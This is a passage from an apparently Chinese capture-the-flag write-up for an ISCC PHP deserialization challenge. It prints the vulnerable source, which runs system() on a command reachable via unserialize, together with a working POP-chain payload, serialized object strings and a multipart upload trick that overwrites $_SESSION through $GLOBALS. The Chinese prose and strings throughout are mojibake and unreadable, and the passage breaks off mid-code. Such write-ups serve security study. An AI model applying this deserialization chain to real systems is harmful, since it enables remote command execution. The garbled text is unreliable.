class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’</span><br><span class="line">--&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;//cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;snowfall&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    particlesJS(<span class="string">&quot;snowfall&quot;</span>, &#123;</span><br><span class="line">        <span class="string">&quot;particles&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;number&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="number">100</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;shape&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;circle&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;size&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="number">10</span>,</span><br><span class="line">                <span class="string">&quot;random&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;line_linked&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;enable&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;move&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;enable&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;speed&quot;</span>: <span class="number">2</span>,</span><br><span class="line">                <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;bottom&quot;</span>,</span><br><span class="line">                <span class="string">&quot;straight&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;interactivity&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;detect_on&quot;</span>: <span class="string">&quot;canvas&quot;</span>,</span><br><span class="line">            <span class="string">&quot;events&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;onhover&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;enable&quot;</span>: <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;modes&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;push&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;particles_nb&quot;</span>: <span class="number">12</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=src&quot;</span>&gt;æˆ‘çœŸçš„æ˜¯æºç ?&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=cmd&quot;</span>&gt;å¹²ç‚¹å¥½äº‹!&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=upload&quot;</span>&gt;é€ç‚¹ä¸œè¥¿!&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=tellmetruth&quot;</span>&gt;å¿«å‘Šè¯‰æˆ‘çœŸç›¸!&lt;/a&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ</span><br></pre></td></tr></table></figure>



<p>ç„¶åèƒ½æ”¯ç¦»ç ´ç¢çš„æŠŠæ¯ä¸€å¤„çš„é—®é¢˜è§£å†³ï¼Œæ¯”å¦‚sessionå˜é‡è¦†ç›–isccIsCciScc1sccï¼Œä½†æ˜¯æˆ‘å´æ‰¾ä¸åˆ°æ€ä¹ˆæŠŠä»–ä»¬ç©¿èµ·æ¥ï¼Œåæ¥é—®äº†å¸¦å¸ˆå‚…æ‰çŸ¥é“åŸæ¥å¯ä»¥å¼ºè¡Œçš„æŠŠä»–ä»¬ç©¿èµ·æ¥,payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cmd = <span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">$upload = <span class="keyword">new</span> ISCC_Upload();</span><br><span class="line">$tellme = <span class="keyword">new</span> ISCC_TellMeTruth();</span><br><span class="line">$com = <span class="keyword">new</span> ISCC_Command();</span><br><span class="line">$upload-&gt;staasdtus = $cmd;</span><br><span class="line">$cmd-&gt;is_upload = $tellme;</span><br><span class="line">$cmd-&gt;status = $com;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹è§uploadè¿™ä¸ªç±»æ˜¯æ²¡æœ‰æˆ‘éšä¾¿å†™çš„è¿™ä¸ªå±æ€§çš„ï¼Œä½†æ˜¯ä¾ç„¶ä¸å½±å“æˆ‘ä»¬è¿›è¡Œæ“ä½œï¼Œdestructå’Œ wakeupä¾ç„¶ä¼šæ‰§è¡Œï¼Œæ—¢ç„¶çŸ¥é“è¿™ä¸ªçŸ¥è¯†ç‚¹é‚£ä¹ˆå°±å¾ˆç®€å•äº†ï¼Œç›´æ¥æŠŠä»–ä»¬è¿èµ·æ¥å°±å¯ä»¥äº†</p>
<p>æ€è·¯:</p>
<p> ä¿®æ”¹session-&gt;æ§åˆ¶cmd-&gt;æ‰§è¡Œ</p>
<p>å›¾ç‰‡ä¸Šä¼ çš„æ—¶å€™åŒæ—¶å†ç©¿ä¸€ä¸ªtextä¸Šå»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryANIrb3jmbjSiBlbn</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;_SESSION&quot;; filename&#x3D;&quot;isccIsCciScc1scc&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">wdnmd</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$status = <span class="string">&quot;new&quot;</span>;</span><br><span class="line">$cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$is_unser_finished = <span class="literal">false</span>;</span><br><span class="line">$iscc_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = (count($_FILES) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $iscc_file;</span><br><span class="line">        $status = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">                $GLOBALS[$key] = $value;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file($iscc_file[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $check = @getimagesize($iscc_file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    $target_dir = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    $target_file = $target_dir . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ($iscc_file[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($iscc_file[<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">                        $iscc_file = $target_file;</span><br><span class="line">                        $status = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $new_cmd=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:6:&quot;whoami&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&#x27;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $status = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            $cmd = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $flag = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        $pAssM0rd = hash(<span class="string">&quot;sha256&quot;</span>, $flag);</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&#x27;pAssM0rd&#x27;</span>] === $pAssM0rd)</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $is_unser_finished;</span><br><span class="line">        $status = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_unser_finished === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system($cmd);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params">$len</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    $randstring = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $randstring .= $characters[rand(<span class="number">0</span>, strlen($characters))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randstring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line">    <span class="keyword">if</span>(stripos($s, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $is_upload = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">    @unlink($iscc_file);</span><br><span class="line">    $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    $whatareyounongshane = $_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($whatareyounongshane) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            $resp = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> $resp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cmd = <span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">$upload = <span class="keyword">new</span> ISCC_Upload();</span><br><span class="line">$tellme = <span class="keyword">new</span> ISCC_TellMeTruth();</span><br><span class="line">$com = <span class="keyword">new</span> ISCC_Command();</span><br><span class="line">$upload-&gt;staasdtus = $cmd;</span><br><span class="line">$cmd-&gt;is_upload = $tellme;</span><br><span class="line">$cmd-&gt;status = $com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize($upload));</span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:2:&#123;s:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(($a)) &#123;</span><br><span class="line"></span><br><span class="line">    $wtf = waf($a) ? $a : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;</span>));</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line"><span class="comment">//    echo $wtf;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($goodshit = @unserialize($wtf)) &#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $is_unser_finished = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//        var_dump($is_unser_finished);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line"><span class="comment">//    var_dump(unserialize(&quot;O:11:\&quot;ISCC_Upload\&quot;:1:&#123;s:6:\&quot;status\&quot;;O:13:\&quot;ISCC_ResetCMD\&quot;:3:&#123;S:10:\&quot;\00\2A\00new_cmd\&quot;;s:6:\&quot;whoami\&quot;;s:9:\&quot;is_upload\&quot;;O:16:\&quot;ISCC_TellMeTruth\&quot;:0:&#123;&#125;s:6:\&quot;status\&quot;;O:12:\&quot;ISCC_Command\&quot;:0:&#123;&#125;&#125;&#125;&quot;));</span></span><br><span class="line">    var_dump($status);</span><br><span class="line">    <span class="keyword">if</span>(in_array($status, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span 